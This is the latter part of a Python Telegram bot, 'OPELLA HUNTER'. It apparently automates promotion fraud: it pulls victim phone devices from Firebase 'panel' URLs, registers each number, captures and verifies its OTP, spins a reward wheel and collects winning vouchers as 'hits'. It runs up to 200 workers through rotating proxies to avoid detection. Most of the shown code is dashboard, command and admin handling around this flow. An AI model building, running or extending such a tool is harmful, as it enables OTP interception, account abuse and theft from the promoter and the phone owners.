def _col_verify(b):
    if b["verified"]: return f"{C['verified']} verified"
    if b["timeout"]:  return f"{C['timeout']} timeout"
    if b["otp_sent"]: return f"{C['waiting']} waiting"
    return "·"

def _col_spin(b):
    if b["result"] == "WIN":
        rew = b["reward"] or ""; amt = b["amount"] or ""
        return f"{C['win']} WIN {rew} ₹{amt}".strip()
    if b["result"] == "LOSE":
        rew = b["reward"] or ""
        return f"{C['lose']} better luck {rew}".strip()
    if b["result"] == "ALREADY": return f"{C['already']} already"
    if b["timeout"]:  return f"{C['failed']} failed"
    if b["verified"]: return f"{C['spinning']} spinning"
    return f"{C['pending']} pending"

def _panel_header(idx, url, total, done=0):
    short = url.replace("https://", "").replace("http://", "").rstrip("/")
    if len(short) > 38: short = short[:35] + "..."
    bar = _bar(done, max(1, total))
    return (f"┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\n"
            f"┃  {C['panel']} PANEL {idx} / {total}    {bar}\n"
            f"┃  {esc(short)}\n"
            f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n")

def _top_header(st):
    cur = st["current_panel"]; tot = len(st["panels"]) or 1
    pct = int(100 * cur / tot) if tot else 0
    bar = _bar(cur, tot)
    return (
        f"╔══════════════════════════════════════════════════╗\n"
        f"║   {C['panel']} OPELLA HUNTER                       ║\n"
        f"╚══════════════════════════════════════════════════╝\n"
        f"\n"
        f"{C['arrow']} Overall  {cur}/{tot}   {bar}  {pct}%\n"
        f"{C['arrow']} {C['win']} Wins {st['wins']}   "
        f"{C['lose']} Losses {st['losses']}   "
        f"{C['hit']} Hits {len(st['hits'])}\n"
        f"{C['arrow']} {C['otp_sent']} OTP {st['otp_sent']}   "
        f"{C['verified']} Verified {st['otp_verified']}   "
        f"{C['done']} Processed {st['processed']}\n"
        f"{LINE}\n")

def render_row(idx, block):
    return (f"  {idx:>2}  {block['phone']:<12}  "
            f"{_col_otp(block):<10} {_col_verify(block):<12} {_col_spin(block)}")

async def _render_and_send(chat_id, force=False):
    lk = get_render_lock(chat_id)
    async with lk:
        st = get_state(chat_id)
        now = time.time()
        since = now - st["last_edit"]
        if not force and since < EDIT_INTERVAL: return
        if force and since < FORCE_EDIT_AFTER: return
        st["last_edit"] = now

        top = _top_header(st)
        sections = []
        for pidx in range(1, len(st["panels"]) + 1):
            pn = st.get("panel_numbers", {}).get(pidx)
            if not pn: continue
            url = st["panels"][pidx - 1] if pidx - 1 < len(st["panels"]) else ""
            ps = st.get("panel_stats", {}).get(pidx, {})
            items = sorted(pn.values(), key=lambda b: b["ts"])
            rows = [render_row(i, b) for i, b in enumerate(items, 1)]
            body = (
                f"  #   NUMBER        OTP        VERIFY       SPIN\n"
                f"  {'─' * 46}\n" + ("\n".join(rows) if rows else "  · waiting…"))
            sections.append(_panel_header(pidx, url, len(st["panels"]), ps.get("total", 0)) + body)
        if not sections:
            sections.append("  · waiting for devices…")

        full = top + "\n\n".join(sections)
        html = f"<pre>{esc(full)}</pre>"
        if len(html) > 4000:
            html = f"<pre>{esc(top)}</pre>"

        if st["log_msg_id"]:
            for _ in range(2):
                try:
                    await asyncio.wait_for(
                        BOT_APP.bot.edit_message_text(
                            chat_id=chat_id, message_id=st["log_msg_id"],
                            text=html, parse_mode="HTML"),
                        timeout=10.0)
                    return
                except BadRequest as e:
                    em = str(e).lower()
                    if "not modified" in em: return
                    if "message to edit not found" in em or "message can't be edited" in em:
                        st["log_msg_id"] = None; break
                except RetryAfter as e:
                    await asyncio.sleep(min(30, e.retry_after + 1))
                except (TimedOut, NetworkError, asyncio.TimeoutError):
                    await asyncio.sleep(1.5)
                except Exception:
                    break
            return

        for _ in range(2):
            try:
                m = await asyncio.wait_for(
                    BOT_APP.bot.send_message(
                        chat_id=chat_id, text=html, parse_mode="HTML"),
                    timeout=10.0)
                st["log_msg_id"] = m.message_id
                return
            except RetryAfter as e:
                await asyncio.sleep(min(30, e.retry_after + 1))
            except (TimedOut, NetworkError, asyncio.TimeoutError):
                await asyncio.sleep(1.5)
            except Exception:
                break

def _kick_render(chat_id, force=False):
    async def _debounced():
        try:
            await asyncio.sleep(0.5)
            await _render_and_send(chat_id, force=force)
        except asyncio.CancelledError: pass
        except Exception: pass

    def _schedule():
        old = RENDER_PENDING.get(chat_id)
        if old and not old.done(): old.cancel()
        RENDER_PENDING[chat_id] = asyncio.create_task(_debounced())

    try:
        asyncio.get_running_loop().call_soon(_schedule)
    except RuntimeError:
        if MAIN_LOOP and not MAIN_LOOP.is_closed():
            MAIN_LOOP.call_soon_threadsafe(_schedule)
    except Exception:
        pass

async def _handle_log(chat_id, msg, cls):
    st = get_state(chat_id)
    m = msg.strip()
    if not m: return
    cur = st["current_panel"] or 1

    mo = RE_REGISTERED.search(m)
    if mo:
        b = ensure_number(st, cur, mo.group(1)); b["otp_sent"] = True
        st["otp_sent"] += 1; _kick_render(chat_id); return

    mo = RE_OTP.search(m)
    if mo:
        b = ensure_number(st, cur, mo.group(1)); b["otp_recv"] = True
        st["otp_verified"] += 1; _kick_render(chat_id); return

    mo = RE_VERIFIED.search(m)
    if mo:
        b = ensure_number(st, cur, mo.group(1)); b["verified"] = True
        _kick_render(chat_id, force=True); return

    mo = RE_TIMEOUT.search(m)
    if mo:
        b = ensure_number(st, cur, mo.group(1)); b["timeout"] = True
        st["errors"] += 1; _kick_render(chat_id, force=True); return

    mo = RE_WIN.search(m)
    if mo:
        phone, rew, amt = mo.group(1), mo.group(2), mo.group(3)
        b = ensure_number(st, cur, phone)
        b["result"] = "WIN"; b["reward"] = rew; b["amount"] = amt
        st["wins"] += 1
        st["panel_stats"].setdefault(cur, {"wins": 0, "loss": 0, "total": 0})
        st["panel_stats"][cur]["wins"] += 1
        _kick_render(chat_id, force=True); return

    mo = RE_LOSE.search(m)
    if mo:
        phone, rew = mo.group(1), mo.group(2)
        b = ensure_number(st, cur, phone)
        b["result"] = "LOSE"; b["reward"] = rew
        st["losses"] += 1
        st["panel_stats"].setdefault(cur, {"wins": 0, "loss": 0, "total": 0})
        st["panel_stats"][cur]["loss"] += 1
        _kick_render(chat_id, force=True); return

    mo = RE_ALREADY.search(m)
    if mo:
        b = ensure_number(st, cur, mo.group(1)); b["result"] = "ALREADY"
        st["already_spun"] += 1; _kick_render(chat_id); return

    mo = RE_DEVICE.search(m)
    if mo and "found" in m.lower():
        st["devices_total"] += int(mo.group(1)); return

    mo = RE_PANEL.search(m)
    if mo:
        st["current_panel"] = int(mo.group(1)); return

    mo = RE_VOUCHER.search(m)
    if mo:
        v = mo.group(1)
        st["hits"].append({"voucher": v, "phone": "", "device": "", "panel": f"P{cur}"})
        _kick_render(chat_id, force=True); return
# ═══════════════════════════════════════════════════════════════════════════
#  PANEL RUNNER
# ═══════════════════════════════════════════════════════════════════════════
async def _run_panel_inner(uid, chat_id, fb_url, panel_idx, total_panels):
    st = get_state(chat_id)
    tag = f"P{panel_idx}"
    stop_ev = get_stop_event(chat_id)
    token = _current_chat.set(chat_id)
    try:
        proxies = mem_get_proxies(uid)

        async def probe_states():
            try:
                probe = OpellaClient(
                    chat_id,
                    proxy=random.choice(proxies)["url"] if proxies else None,
                    proxy_pool=proxies)
                await asyncio.to_thread(probe.create_user)
                sc = await asyncio.to_thread(probe.get_state_cities)
                try: probe.s.close()
                except Exception: pass
                return extract_state_city_pairs(sc)
            except Exception:
                return []

        st_pairs, devices = await asyncio.gather(
            probe_states(),
            asyncio.to_thread(fetch_devices_for_panel, fb_url),
        )
        if not st_pairs: st_pairs = [("Karnataka", "Bangalore")]
        if not devices: return

        for d in devices: ensure_number(st, panel_idx, d["phone"])
        st["devices_total"] += len(devices)
        st["panel_stats"].setdefault(panel_idx, {"wins": 0, "loss": 0, "total": len(devices)})
        st["panel_stats"][panel_idx]["total"] = len(devices)
        await _render_and_send(chat_id, force=True)

        # Admin-configurable worker count (default 10)
        workers = get_max_workers()
        sem = asyncio.Semaphore(workers)
        proxy_cycle = None
        if proxies:
            def cyc():
                while True:
                    for p in proxies: yield p
            proxy_cycle = cyc()

        async def _one(d):
            if stop_ev.is_set(): return
            async with sem:
                if stop_ev.is_set(): return
                proxy = next(proxy_cycle)["url"] if proxy_cycle else None
                try:
                    await asyncio.to_thread(
                        flow_for_phone, uid, chat_id, d["phone"], d["client_id"],
                        d["firebase_url"], proxy, tag, st_pairs, proxies)
                    st["processed"] += 1
                except Exception:
                    pass

        tasks = []
        for d in devices:
            if stop_ev.is_set(): break
            tasks.append(asyncio.create_task(_one(d)))
            await asyncio.sleep(random.uniform(0.02, 0.08))

        if tasks: await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        _current_chat.reset(token)

async def run_panel_async(uid, chat_id, fb_url, panel_idx, total_panels):
    if GLOBAL_USER_SEM is not None:
        async with GLOBAL_USER_SEM:
            await _run_panel_inner(uid, chat_id, fb_url, panel_idx, total_panels)
    else:
        await _run_panel_inner(uid, chat_id, fb_url, panel_idx, total_panels)

# ═══════════════════════════════════════════════════════════════════════════
#  KEYBOARD
# ═══════════════════════════════════════════════════════════════════════════
def main_menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("▶ Run", callback_data="run"),
         InlineKeyboardButton("■ Stop", callback_data="stop")],
        [InlineKeyboardButton("ℹ Status", callback_data="status"),
         InlineKeyboardButton("🏆 Hits", callback_data="hits")],
        [InlineKeyboardButton("▤ Panels", callback_data="panels"),
         InlineKeyboardButton("🗑 Clear", callback_data="clear")],
    ])

def admin_kb():
    cur = get_max_workers()
    rows = []
    row = []
    for n in WORKER_CHOICES:
        mark = "●" if n == cur else "○"
        row.append(InlineKeyboardButton(f"{mark} {n}", callback_data=f"setw:{n}"))
        if len(row) == 3:
            rows.append(row); row = []
    if row: rows.append(row)
    rows.append([InlineKeyboardButton("✏️ Custom  (/setworkers N)",
                                      callback_data="setw_custom")])
    rows.append([InlineKeyboardButton("✖ Close", callback_data="admin_close")])
    return InlineKeyboardMarkup(rows)

async def _safe_reply(update, text, **kwargs):
    msg = update.effective_message
    if msg is None:
        chat = update.effective_chat
        if chat is None: return
        await BOT_APP.bot.send_message(chat.id, text, **kwargs); return
    await msg.reply_text(text, **kwargs)

# ═══════════════════════════════════════════════════════════════════════════
#  COMMANDS
# ═══════════════════════════════════════════════════════════════════════════
async def cmd_start(update, ctx):
    await _safe_reply(update,
        f"{C['panel']} {BOT_NAME}\n{LINE}\n"
        f"Send panel URL(s) — one per line:\n"
        f"  <code>https://xxx.firebaseio.com</code>\n\n{LINE}\n"
        f"Use the buttons below to control.",
        parse_mode="HTML", reply_markup=main_menu_kb())

async def cmd_panel(update, ctx):
    msg = update.effective_message
    if msg is None or msg.text is None:
        await _safe_reply(update, f"{C['error']} no text."); return
    chat = update.effective_chat
    if chat is None: return
    uid = update.effective_user.id
    st = get_state(chat.id)
    urls = re.findall(r"https?://[^\s]+", msg.text or "")
    if not urls:
        await _safe_reply(update, f"{C['error']} no URL."); return
    added, dup = 0, 0
    for u in urls:
        parsed = parse_panel_link(u)
        if not parsed: continue
        if parsed in st["panels"]: dup += 1; continue
        st["panels"].append(parsed)
        mem_add_panel(uid, parsed)
        added += 1
    if added:
        await _safe_reply(update,
            f"{C['done']} added {added}  ·  total {len(st['panels'])}",
            reply_markup=main_menu_kb())
    elif dup:
        await _safe_reply(update,
            f"{C['already']} already exists  ·  total {len(st['panels'])}",
            reply_markup=main_menu_kb())

async def cmd_run(update, ctx, chat_id=None):
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    uid = update.effective_user.id
    st = get_state(chat_id)
    if st["running"]:
        await BOT_APP.bot.send_message(chat_id, f"{C['error']} already running."); return
    if not st["panels"]:
        await BOT_APP.bot.send_message(chat_id, f"{C['error']} add panel first."); return
    if st.get("log_msg_id"):
        try: await BOT_APP.bot.delete_message(chat_id, st["log_msg_id"])
        except Exception: pass
        st["log_msg_id"] = None
    st.update({"running": True, "current_panel": 0, "devices_total": 0, "processed": 0,
               "wins": 0, "losses": 0, "already_spun": 0, "otp_sent": 0, "otp_verified": 0,
               "errors": 0, "panel_stats": {}, "hits": [], "panel_numbers": {},
               "numbers": {}, "num_order": deque(), "last_edit": 0, "started_at": time.time()})
    st["stop_event"] = threading.Event()
    clear_stop_event(chat_id)
    await _render_and_send(chat_id, force=True)
    await BOT_APP.bot.send_message(chat_id,
        f"{C['panel']} starting  ·  {len(st['panels'])} panel(s)  ·  "
        f"workers {get_max_workers()}\n{LINE}",
        parse_mode="HTML", reply_markup=main_menu_kb())
    async def _runner():
        try:
            for i, url in enumerate(st["panels"], 1):
                if get_stop_event(chat_id).is_set(): break
                st["current_panel"] = i
                try: await run_panel_async(uid, chat_id, url, i, len(st["panels"]))
                except Exception: pass
                await asyncio.sleep(PANEL_GAP)
        finally:
            st["running"] = False
            try: await send_final(chat_id)
            except Exception: pass
    asyncio.create_task(_runner())

async def send_final(chat_id):
    st = get_state(chat_id)
    lines = [f"{C['done']} FINAL", LINE,
             f"panels     ▸ {len(st['panels'])}",
             f"processed  ▸ {st['processed']}",
             f"{C['win']} win     ▸ {st['wins']}",
             f"{C['lose']} better luck ▸ {st['losses']}",
             f"{C['already']} already ▸ {st['already_spun']}",
             f"{C['hit']} hits    ▸ {len(st['hits'])}", LINE]
    for idx, s in sorted(st["panel_stats"].items()):
        lines.append(f"panel {idx}:  W{s['wins']}  L{s['loss']}  T{s['total']}")
    if st["hits"]:
        lines += ["", f"{C['hit']} HITS", LINE]
        for i, h in enumerate(st["hits"], 1):
            lines.append(f"#{i}  <code>{esc(h['voucher'])}</code>")
    text = "\n".join(lines)
    for attempt in range(3):
        try:
            await asyncio.wait_for(
                BOT_APP.bot.send_message(chat_id, text, parse_mode="HTML"),
                timeout=20.0)
            return
        except RetryAfter as e:
            await asyncio.sleep(min(45, e.retry_after + 1))
        except (TimedOut, NetworkError, asyncio.TimeoutError):
            await asyncio.sleep(2 ** attempt)
        except Exception:
            await asyncio.sleep(2 ** attempt)

async def cmd_stop(update, ctx, chat_id=None):
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    st = get_state(chat_id)
    st["stop_event"].set()
    get_stop_event(chat_id).set()
    await BOT_APP.bot.send_message(chat_id, f"{C['already']} stopping")

async def cmd_status(update, ctx, chat_id=None):
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    st = get_state(chat_id)
    await BOT_APP.bot.send_message(chat_id,
        f"<pre>{esc(_top_header(st))}</pre>", parse_mode="HTML")

async def cmd_hits(update, ctx, chat_id=None):
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    uid = update.effective_user.id
    st = get_state(chat_id)
    hits = list(st["hits"])
    mem_v = mem_get_vouchers(uid)
    if not hits and not mem_v:
        await BOT_APP.bot.send_message(chat_id, f"{C['error']} no hits"); return
    lines = [f"{C['hit']} HITS", LINE, ""]
    if mem_v:
        for line in mem_v[-50:]:
            lines.append(f"  {line}")
    elif hits:
        for i, h in enumerate(hits, 1):
            lines.append(f"#{i}  <code>{esc(h['voucher'])}</code>")
    txt = "\n".join(lines)
    for ch in [txt[i:i+4000] for i in range(0, len(txt), 4000)]:
        try: await BOT_APP.bot.send_message(chat_id, ch, parse_mode="HTML")
        except Exception: pass
async def cmd_panels(update, ctx, chat_id=None):
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    st = get_state(chat_id)
    if not st["panels"]:
        await BOT_APP.bot.send_message(chat_id, f"{C['error']} no panels"); return
    lines = [f"panels ({len(st['panels'])})", LINE, ""]
    for i, u in enumerate(st["panels"], 1):
        lines.append(f"{i}. <code>{esc(u)}</code>")
    await BOT_APP.bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")

async def cmd_clear(update, ctx, chat_id=None):
    if chat_id is None:
        chat = update.effective_chat
        if chat is None: return
        chat_id = chat.id
    st = get_state(chat_id)
    st["panels"] = []
    mem_clear_panels(update.effective_user.id)
    await BOT_APP.bot.send_message(chat_id, f"{C['done']} cleared")

async def cmd_clearpanels(update, ctx):
    await cmd_clear(update, ctx)

async def cmd_vouchers(update, ctx):
    await cmd_hits(update, ctx)

# ── ADMIN ──────────────────────────────────────────────────────────────────
async def cmd_admin(update, ctx):
    u = update.effective_user
    if u is None or not is_admin(u.id):
        await _safe_reply(update, f"{C['error']} admin only."); return
    cur = get_max_workers()
    text = (
        f"{C['panel']} <b>Admin Panel</b>\n{LINE}\n"
        f"Max workers per panel: <b>{cur}</b>\n\n"
        f"Pick a value below, or send <code>/setworkers N</code> (1–200)."
    )
    await _safe_reply(update, text, parse_mode="HTML", reply_markup=admin_kb())

async def cmd_setworkers(update, ctx):
    u = update.effective_user
    if u is None or not is_admin(u.id):
        await _safe_reply(update, f"{C['error']} admin only."); return
    msg = update.effective_message
    if msg is None or msg.text is None:
        await _safe_reply(update, f"{C['error']} usage: /setworkers N"); return
    parts = msg.text.split()
    if len(parts) < 2 or not parts[1].lstrip("-").isdigit():
        await _safe_reply(update, f"{C['error']} usage: /setworkers N"); return
    n = set_max_workers(int(parts[1]))
    await _safe_reply(update,
        f"{C['done']} max workers set to <b>{n}</b>",
        parse_mode="HTML", reply_markup=admin_kb())

async def on_callback(update, ctx):
    q = update.callback_query
    if q is None: return
    try: await q.answer()
    except BadRequest: pass
    except Exception: pass
    chat_id = q.message.chat.id if q.message else None
    if chat_id is None: return
    d = q.data
    uid = q.from_user.id if q.from_user else 0

    if d == "run":    await cmd_run(update, ctx, chat_id)
    elif d == "stop":   await cmd_stop(update, ctx, chat_id)
    elif d == "status": await cmd_status(update, ctx, chat_id)
    elif d == "hits":   await cmd_hits(update, ctx, chat_id)
    elif d == "panels": await cmd_panels(update, ctx, chat_id)
    elif d == "clear":  await cmd_clear(update, ctx, chat_id)
    elif d.startswith("setw:"):
        if not is_admin(uid):
            try: await q.answer("admin only", show_alert=True)
            except Exception: pass
            return
        try: n = int(d.split(":", 1)[1])
        except Exception: return
        set_max_workers(n)
        try:
            await q.edit_message_text(
                f"{C['panel']} <b>Admin Panel</b>\n{LINE}\n"
                f"Max workers per panel: <b>{get_max_workers()}</b>",
                parse_mode="HTML", reply_markup=admin_kb())
        except Exception:
            pass
    elif d == "setw_custom":
        if not is_admin(uid): return
        await BOT_APP.bot.send_message(
            chat_id,
            f"Send <code>/setworkers N</code> (1–200).",
            parse_mode="HTML")
    elif d == "admin_close":
        try: await q.message.delete()
        except Exception: pass

async def handle_text(update, ctx):
    msg = update.effective_message
    if msg is None or msg.text is None: return
    chat = update.effective_chat
    if chat is None: return

    urls = re.findall(r"https?://[^\s]+", msg.text.strip())
    if not urls: return
    uid = update.effective_user.id
    st = get_state(chat.id)
    added, dup = 0, 0
    for u in urls:
        parsed = parse_panel_link(u)
        if not parsed: continue
        if parsed in st["panels"]: dup += 1; continue
        st["panels"].append(parsed)
        mem_add_panel(uid, parsed)
        added += 1
    if added:
        await msg.reply_text(
            f"{C['done']} added {added}  ·  total {len(st['panels'])}",
            reply_markup=main_menu_kb())

async def error_handler(update, ctx):
    pass

async def post_init(app):
    global MAIN_LOOP, GLOBAL_USER_SEM
    MAIN_LOOP = asyncio.get_running_loop()
    GLOBAL_USER_SEM = asyncio.Semaphore(MAX_GLOBAL_USERS)
    print(f"[startup] {BOT_NAME} v18.1 | workers={get_max_workers()} "
          f"| admins={len(ADMIN_IDS)}", flush=True)
    await app.bot.set_my_commands([
        BotCommand("start", "Menu"), BotCommand("panel", "Add panel(s)"),
        BotCommand("panels", "List panels"), BotCommand("run", "Start"),
        BotCommand("stop", "Stop"), BotCommand("status", "Stats"),
        BotCommand("hits", "Hits"), BotCommand("vouchers", "Vouchers"),
        BotCommand("clearpanels", "Clear"), BotCommand("admin", "Admin panel"),
        BotCommand("setworkers", "Set max workers (admin)"),
    ])
    print(f"[startup] ready | polling", flush=True)

def main():
    global BOT_APP
    BOT_APP = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    BOT_APP.add_handler(CommandHandler("start", cmd_start))
    BOT_APP.add_handler(CommandHandler("panel", cmd_panel))
    BOT_APP.add_handler(CommandHandler("panels", cmd_panels))
    BOT_APP.add_handler(CommandHandler("clearpanels", cmd_clearpanels))
    BOT_APP.add_handler(CommandHandler("run", cmd_run))
    BOT_APP.add_handler(CommandHandler("stop", cmd_stop))
    BOT_APP.add_handler(CommandHandler("status", cmd_status))
    BOT_APP.add_handler(CommandHandler("hits", cmd_hits))
    BOT_APP.add_handler(CommandHandler("vouchers", cmd_vouchers))
    BOT_APP.add_handler(CommandHandler("admin", cmd_admin))
    BOT_APP.add_handler(CommandHandler("setworkers", cmd_setworkers))
    BOT_APP.add_handler(CallbackQueryHandler(on_callback))
    BOT_APP.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    BOT_APP.add_error_handler(error_handler)

    BOT_APP.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
    )

if __name__ == "__main__":
    main()
